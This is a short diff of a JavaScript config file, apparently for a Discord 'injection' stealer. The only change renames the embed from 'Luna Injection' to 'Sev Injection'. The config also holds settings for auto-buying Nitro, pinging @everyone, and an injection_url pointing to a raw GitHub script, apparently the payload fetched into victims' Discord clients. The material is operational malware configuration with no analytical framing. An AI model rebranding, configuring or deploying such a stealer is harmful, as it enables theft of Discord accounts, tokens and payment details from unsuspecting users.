@@ -13,7 +13,7 @@ const config = {
   'auto_buy_nitro': false,
   'ping_on_run': false,
   'ping_val': "@everyone",
-  'embed_name': "Luna Injection",
+  'embed_name': "Sev Injection",
   'embed_icon': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=&width=464&height=464",
   'embed_color': 0x560ddc,
   'injection_url': "https://raw.githubusercontent.com/pentacute1/test/main/test.js",
